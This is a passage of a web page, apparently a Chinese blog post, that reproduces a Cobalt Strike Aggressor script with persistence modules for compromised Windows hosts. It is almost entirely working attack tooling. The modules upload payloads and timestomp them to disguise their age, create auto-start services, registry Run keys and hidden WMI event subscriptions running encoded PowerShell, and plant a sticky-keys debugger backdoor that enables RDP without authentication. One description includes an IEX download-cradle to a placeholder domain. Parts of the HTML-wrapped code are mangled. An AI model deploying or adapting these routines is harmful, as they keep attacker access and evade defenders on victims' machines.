class="code-snippet__string">"运行的用户:"</span>);              <span class="code-snippet__comment">#运行程序到用户名称</span></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"targetpath"</span>, <span class="code-snippet__string">"执行exe的目标路径:"</span>);          <span class="code-snippet__comment">#上传到目标</span></span></code><code><span class="code-snippet_outer">  drow_file($dialog, <span class="code-snippet__string">"payloadfile"</span>, <span class="code-snippet__string">"DLL Payload上传到目标路径里面:"</span>);    <span class="code-snippet__comment">#木马上传</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#服务启动项</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistCustomService</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Admin Level Custom Service EXE Persistence"</span>, %(<span class="code-snippet__string">servicename =&gt;</span> <span class="code-snippet__string">"Custom Service Name.."</span>, <span class="code-snippet__string">display =&gt;</span> <span class="code-snippet__string">"Display Name for Custom Service.."</span>, <span class="code-snippet__string">description =&gt;</span> <span class="code-snippet__string">"Description for Custom Service.."</span>, <span class="code-snippet__string">targetpath =&gt;</span> <span class="code-snippet__string">"Target Path.."</span>, <span class="code-snippet__string">payloadfile =&gt;</span> <span class="code-snippet__string">"Select Payload.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['servicename']"</span> ismatch <span class="code-snippet__string">'Custom Service Name..'</span> || <span class="code-snippet__string">"$3['targetpath']"</span> ismatch <span class="code-snippet__string">'Target Path..'</span> || <span class="code-snippet__string">"$3['display']"</span> ismatch <span class="code-snippet__string">'Display Name for Custom Service..'</span> || <span class="code-snippet__string">"$3['description']"</span> ismatch <span class="code-snippet__string">'Description for Custom Service..'</span> || <span class="code-snippet__string">"$3['payloadfile']"</span> ismatch <span class="code-snippet__string">'Select Payload..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Custom Service Name, Target Path, Display Name, Description and Payload File."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      bcd($bid, $3[<span class="code-snippet__string">'targetpath'</span>]);</span></code><code><span class="code-snippet_outer">      bupload($bid, $3[<span class="code-snippet__string">'payloadfile'</span>]);</span></code><code><span class="code-snippet_outer">      btimestomp($bid, <span class="code-snippet__string">"$3['payloadfile']"</span>, <span class="code-snippet__string">"C:\\Windows\\System32\\cmd.exe"</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'sc delete "'</span>.$3[<span class="code-snippet__string">'servicename'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'sc create "'</span>.$3[<span class="code-snippet__string">'servicename'</span>].<span class="code-snippet__string">'" binpath= '</span>.$3[<span class="code-snippet__string">'targetpath'</span>].<span class="code-snippet__string">"\\"</span>.<span class="code-snippet__keyword">split</span>(<span class="code-snippet__string">"/"</span>,$3[<span class="code-snippet__string">'payloadfile'</span>])[-<span class="code-snippet__number">1</span>].<span class="code-snippet__string">' error= ignore start= auto DisplayName= "'</span>.$3[<span class="code-snippet__string">'display'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'sc description "'</span>.$3[<span class="code-snippet__string">'servicename'</span>].<span class="code-snippet__string">'" "'</span>.$3[<span class="code-snippet__string">'description'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'sc start "'</span>.$3[<span class="code-snippet__string">'servicename'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"Generates a Custom Service for Admin Level persistence on selected beacon. **Only Service EXE Payloads should be used**"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"servicename"</span>,  <span class="code-snippet__string">"自定义服务名称:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"display"</span>, <span class="code-snippet__string">"自定义服务的显示名称:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"description"</span>, <span class="code-snippet__string">"自定义服务的说明:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"targetpath"</span>, <span class="code-snippet__string">"目标/二进制exe的路径:"</span>);</span></code><code><span class="code-snippet_outer">  drow_file($dialog, <span class="code-snippet__string">"payloadfile"</span>, <span class="code-snippet__string">"Payload:"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#注册表启动项</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistRegistry</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Registry Persistence"</span>, %(<span class="code-snippet__string">reglocation =&gt;</span> <span class="code-snippet__string">"Registry Location.."</span>, <span class="code-snippet__string">keyname =&gt;</span> <span class="code-snippet__string">"Key Name.."</span>, <span class="code-snippet__string">datatype =&gt;</span> <span class="code-snippet__string">"Data Type..(REG_SZ)"</span>, <span class="code-snippet__string">keyvalue =&gt;</span> <span class="code-snippet__string">"Key Value..(Payload)"</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['reglocation']"</span> ismatch <span class="code-snippet__string">'Registry Location..'</span> || <span class="code-snippet__string">"$3['keyname']"</span> ismatch <span class="code-snippet__string">'Key Name..'</span> || <span class="code-snippet__string">"$3['datatype']"</span> ismatch <span class="code-snippet__string">'Data Type..(REG_SZ)'</span> || <span class="code-snippet__string">"$3['keyvalue']"</span> ismatch <span class="code-snippet__string">'Key Value..(Payload)'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Registry Location, Key Name, Key Type, and a valid Payload Location."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'reg add "'</span>.$3[<span class="code-snippet__string">'reglocation'</span>].<span class="code-snippet__string">'" /v "'</span>.$3[<span class="code-snippet__string">'keyname'</span>].<span class="code-snippet__string">'" /t "'</span>.$3[<span class="code-snippet__string">'datatype'</span>].<span class="code-snippet__string">'" /d "'</span>.$3[<span class="code-snippet__string">'keyvalue'</span>].<span class="code-snippet__string">'" /f'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'reg query "'</span>.$3[<span class="code-snippet__string">'reglocation'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"Registry Persistence - Creates a custom Registry Entry for persistence on selected beacon. **HKLM\\ could require elevated access."</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"reglocation"</span>,  <span class="code-snippet__string">"注册表位置:"</span>);    <span class="code-snippet__comment">#HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\run</span></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyname"</span>, <span class="code-snippet__string">"注册表项名称:"</span>);      <span class="code-snippet__comment">#注册表名称</span></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"datatype"</span>, <span class="code-snippet__string">"注册表项类型:"</span>);     <span class="code-snippet__comment">#类型参考：https://www.cnblogs.com/qingtian224/p/9071709.html</span></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"keyvalue"</span>, <span class="code-snippet__string">"注册表的值(payload路径):"</span>);     <span class="code-snippet__comment">#木马路径</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#WMI启动项</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistwmieventwmic</span> </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Permanent WMI Event using WMIC Persistence"</span>, %(<span class="code-snippet__string">eventfilter =&gt;</span> <span class="code-snippet__string">"__EventFilter Name.."</span>, <span class="code-snippet__string">eventquery =&gt;</span> <span class="code-snippet__string">"Event Query...(Win32 Classes)"</span>, <span class="code-snippet__string">eventconsumer =&gt;</span> <span class="code-snippet__string">"CommandLineEventConsumer Name..(Must be different from __EventFilter Name)"</span>, <span class="code-snippet__string">commandline =&gt;</span> <span class="code-snippet__string">"CommandLineTemplate Syntax..(powershell.exe -w hidden -enc)"</span>, <span class="code-snippet__string">payloadfile =&gt;</span> <span class="code-snippet__string">"Encoded Payload String.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['eventfilter']"</span> ismatch <span class="code-snippet__string">'__EventFilter Name..'</span> || <span class="code-snippet__string">"$3['eventquery']"</span> ismatch <span class="code-snippet__string">'Event Query...(Win32 Classes)'</span> || <span class="code-snippet__string">"$3['eventconsumer']"</span> ismatch <span class="code-snippet__string">'CommandLineEventConsumer Name..(Must be different from __EventFilter Name)'</span> || <span class="code-snippet__string">"$3['commandline']"</span> ismatch <span class="code-snippet__string">'CommandLineTemplate Syntax..(powershell.exe -w hidden)'</span> || <span class="code-snippet__string">"$3['payloadfile']"</span> ismatch <span class="code-snippet__string">'Select Encoded Payload..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Custom __EventFilter Name, Event Query, CommandLineEventConsumer Name, Command Line Options, and the Encoded Payload File."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'</span>.$3[<span class="code-snippet__string">'eventquery'</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'</span>.$3[<span class="code-snippet__string">'eventconsumer'</span>].<span class="code-snippet__string">'", CommandLineTemplate="'</span>.$3[<span class="code-snippet__string">'commandline'</span>].<span class="code-snippet__string">" "</span>.<span class="code-snippet__keyword">split</span>(<span class="code-snippet__string">"/"</span>,$3[<span class="code-snippet__string">'payloadfile'</span>])[-<span class="code-snippet__number">1</span>].<span class="code-snippet__string">'"'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">'\"", Consumer="CommandLineEventConsumer.Name=\"'</span>.$3[<span class="code-snippet__string">'eventconsumer'</span>].<span class="code-snippet__string">'\""'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list'</span>);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** "</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">#base 64 encode IEX of the powershell one liner</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__comment">#cat payload.txt | iconv --to-code=UTF-16LE | base64</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"eventfilter"</span>,  <span class="code-snippet__string">"自定义事件筛选器:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"eventquery"</span>, <span class="code-snippet__string">"自定义事件查询:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"eventconsumer"</span>, <span class="code-snippet__string">"自定义命令行事件使用者:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"commandline"</span>, <span class="code-snippet__string">"自定义命令行选项:"</span>);</span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"payloadfile"</span>, <span class="code-snippet__string">"Custom Encoded Payload String:"</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  dbutton_action($dialog, <span class="code-snippet__string">"Create"</span>);</span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">#WMI启动项-使用powershell</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistwmievent</span>  </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">if</span> (-is64 $bid) {</span></code><code><span class="code-snippet_outer">    $ExePath = <span class="code-snippet__string">"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc"</span>;</span></code><code><span class="code-snippet_outer">  }</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">    $ExePath = <span class="code-snippet__string">"C:\\Windows\\powershell.exe -nop -w hidden -enc"</span>;</span></code><code><span class="code-snippet_outer">  }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"Permanent WMI Event Persistence with PowerShell"</span>, %(<span class="code-snippet__string">eventfilter =&gt;</span> <span class="code-snippet__string">"__EventFilter Name.."</span>, <span class="code-snippet__string">eventquery =&gt;</span> <span class="code-snippet__string">"Event Query...(Win32 Classes)"</span>, <span class="code-snippet__string">payloadstring =&gt;</span> <span class="code-snippet__string">"Encoded Payload String.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['eventfilter']"</span> ismatch <span class="code-snippet__string">'__EventFilter Name..'</span> || <span class="code-snippet__string">"$3['eventquery']"</span> ismatch <span class="code-snippet__string">'Event Query...(Win32 Classes)'</span> || <span class="code-snippet__string">"$3['payloadstring']"</span> ismatch <span class="code-snippet__string">'Encoded Payload String..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid __EventFilter Name, Event Query, and an Encoded Payload String."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      $powershellcmd = <span class="code-snippet__string">"\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments <span class="code-snippet__subst">@{name=\<span class="code-snippet__string">""</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">"\";EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\""</span>.$3[<span class="code-snippet__string">'eventquery'</span>].<span class="code-snippet__string">"\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments <span class="code-snippet__subst">@{Name=\<span class="code-snippet__string">""</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">"\";CommandLineTemplate =\""</span>. $ExePath .<span class="code-snippet__string">" "</span>.$3[<span class="code-snippet__string">'payloadstring'</span>].<span class="code-snippet__string">"\"};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments <span class="code-snippet__subst">@{Filter=\$Filter;Consumer=\$Consumer}</span>;"</span>;</span></span></span></span></span></code><code><span class="code-snippet_outer">      bpowershell!($bid, $powershellcmd);</span></code><code><span class="code-snippet_outer">      blog($bid, <span class="code-snippet__string">'Permanently Storing '</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">' in root\CimV2..'</span>);</span></code><code><span class="code-snippet_outer">      bpowershell($bid, <span class="code-snippet__string">'Get-WmiObject __eventFilter -namespace root\subscription -filter "name=\''</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">'\'"'</span>);</span></code><code><span class="code-snippet_outer">      bpowershell($bid, <span class="code-snippet__string">'Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name=\''</span>.$3[<span class="code-snippet__string">'eventfilter'</span>].<span class="code-snippet__string">'\'"'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dialog_description($dialog, "</span>Generates a Custom WMI Event using PowerShell <span class="code-snippet__keyword">for</span> SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload String must be converted to UTF-<span class="code-snippet__number">16</span>LE, base64 encoded <span class="code-snippet__keyword">and</span> under <span class="code-snippet__number">1</span>MB.**<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_text($dialog, "</span>eventfilter<span class="code-snippet__string">",  "</span>自定义事件筛选器:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_text($dialog, "</span>eventquery<span class="code-snippet__string">", "</span>自定义事件查询:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_text($dialog, "</span>payloadstring<span class="code-snippet__string">", "</span>Custom Encoded Payload String:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dbutton_action($dialog, "</span>Create<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">#Startup Script Local GPO Persistence</span></code><code><span class="code-snippet_outer">#Author: @r3dQu1nn</span></code><code><span class="code-snippet_outer">#Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon </span></code><code><span class="code-snippet_outer">#Calls back as SYSTEM </span></code><code><span class="code-snippet_outer">#**Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**</span></code><code><span class="code-snippet_outer">#**Beacon execution will cause winlogon.exe to hang and the end user can't login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.**</span></code><code><span class="code-snippet_outer">#https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">sub persistStartupGPO  {</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  $dialog = dialog("</span>Startup Script Local GPO Persistence<span class="code-snippet__string">", %(scriptfile =&gt; "</span>Select PS1 Script File..<span class="code-snippet__string">"), lambda({</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">    if ("</span>$3[<span class="code-snippet__string">'scriptfile'</span>]<span class="code-snippet__string">" ismatch 'Select PS1 Script File..') {</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      berror($bid, "</span>\c4Please enter a valid Script Path, <span class="code-snippet__keyword">and</span> .ps1 Script File.<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">      break;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    else {</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      bcd($bid, "</span>C:\\<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">      bupload($bid, $3['scriptfile']);</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      $handle = openf("</span>&gt;psscripts.ini<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      writeb($handle, "</span>[ScriptsConfig]\nStartExecutePSFirst=true\n[Startup]\n0CmdLine=<span class="code-snippet__string">".split("</span>/<span class="code-snippet__string">",$3['scriptfile'])[-1]."</span>\n0Parameters=<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">      closef($handle);</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      bpowershell($bid, 'Move-Item -force -path C:\\'.split("</span>/<span class="code-snippet__string">",$3['scriptfile'])[-1].' -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\');</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      bupload($bid, script_resource("</span>psscripts.ini<span class="code-snippet__string">"));</span></span></code><code><span class="code-snippet_outer">      bpowershell($bid, 'Remove-Item -Force C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\psscripts.ini');</span></code><code><span class="code-snippet_outer">      bpowershell($bid, 'Move-Item -force -path C:\\psscripts.ini -destination C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\');</span></code><code><span class="code-snippet_outer">      bshell($bid, 'gpupdate /force');</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dialog_description($dialog, "</span>Startup Script Local GPO Persistence - Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file <span class="code-snippet__keyword">for</span> persistence on selected beacon. **Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing**<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_file($dialog, "</span>scriptfile<span class="code-snippet__string">", "</span>.ps1 Script File:<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dbutton_action($dialog, "</span>Create<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer">  dialog_show($dialog);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">sub stickykeys {</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  bshell($1, 'REG ADD "</span>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="code-snippet__string">" /v fDenyTSConnections /t REG_DWORD /d 0 /f');</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  bshell($1, 'REG ADD "</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe<span class="code-snippet__string">" /v Debugger /t REG_SZ /d "</span>c:\windows\system32\cmd.exe<span class="code-snippet__string">"');</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  bshell($1, 'REG ADD "</span>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<span class="code-snippet__string">" /v UserAuthentication /t REG_DWORD /d "</span><span class="code-snippet__number">0</span><span class="code-snippet__string">" /f');</span></span></code><code><span class="code-snippet_outer">  bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  bshell($1, 'netsh advfirewall firewall set rule group="</span>remote desktop<span class="code-snippet__string">" new enable=Yes');</span></span></code><code><span class="code-snippet_outer">  bshell($1, 'net start TermService');</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">sub persistThroughStartUpFolder {</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  $dialog = dialog("</span>Start Up Folder Persistence<span class="code-snippet__string">", %(startup =&gt; "</span>Startup Directory Folder..<span class="code-snippet__string">", payload =&gt; "</span>Select Payload..<span class="code-snippet__string">"), lambda({</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">    if ("</span>$3[<span class="code-snippet__string">'startup'</span>]<span class="code-snippet__string">" ismatch 'Startup Directory Folder..' || "</span>$3[<span class="code-snippet__string">'payload'</span>]<span class="code-snippet__string">" ismatch 'Select Payload..') {</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      berror($bid, "</span>\c4Please enter a valid Startup Directory Folder, <span class="code-snippet__keyword">and</span> <span class="code-snippet__keyword">select</span> a Payload<span class="code-snippet__string">")</span></span></code><code><span class="code-snippet_outer">      break;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    else {</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      bshell($bid, 'cd "</span><span class="code-snippet__string">'.$3['</span>startup<span class="code-snippet__string">'].'</span><span class="code-snippet__string">"');</span></span></code><code><span class="code-snippet_outer">      bupload($bid, $3['payload']);</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">      btimestomp($bid, "</span>$3[<span class="code-snippet__string">'payload'</span>]<span class="code-snippet__string">", "</span>c:\\windows\\system32\\calc.exe<span class="code-snippet__string">");  </span></span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  dialog_description($dialog, "</span>Start Up Folder Persistence - Generates a Startup Folder Entry <span class="code-snippet__keyword">and</span> places a payload inside that folder. **Windows NT <span class="code-snippet__number">6.0</span>-<span class="code-snippet__number">10.0</span>/All Users Location - %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | Windows NT <span class="code-snippet__number">6.0</span>-<span class="code-snippet__number">10.0</span>/Current User Location %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span class="code-snippet__string">");</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet_outer">  drow_text($dialog, "</span>startup<span 